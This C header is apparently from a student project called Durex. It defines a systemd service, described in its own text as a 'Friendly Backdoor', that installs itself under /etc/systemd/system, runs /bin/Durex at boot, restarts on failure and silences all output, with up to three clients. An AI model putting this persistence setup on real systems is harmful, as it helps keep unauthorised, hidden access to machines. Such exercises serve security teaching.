/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   Durex.h                                            :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: banthony <banthony@student.42.fr>          +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2019/11/06 13:29:18 by banthony          #+#    #+#             */
/*   Updated: 2019/11/19 15:20:44 by banthony         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#ifndef		DUREX_H
# define	DUREX_H

#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include "utils.h"
#include "Daemon.h"
#include "server.h"

# define SERVICE_FILE "durex.service"
# define SERVICE_PATH "/etc/systemd/system/" SERVICE_FILE
# define SERVICE_FILE_CONTENT	"[Unit]\n"						 	\
								"Description=Friendly Backdoor\n"	\
								"After=network-online.target\n"	 	\
								"Wants=network-online.target\n\n"	\
								"[Service]\n"						\
								"Type=forking\n"					\
								"ExecStart=/bin/Durex\n"			\
								"PIDFile=/var/lock/durex.lock\n"	\
								"Restart=on-failure\n"				\
								"RestartSec=1\n"					\
								"WorkingDirectory=/\n"				\
								"StandardInput=null\n"				\
								"StandardOutput=null\n"				\
								"StandardError=null\n"				\
								"KillMode=mixed\n\n"				\
								"[Install]\n"						\
								"WantedBy=multi-user.target\n"
# define MAX_CLIENT 3

void	install_service(void);

#endif
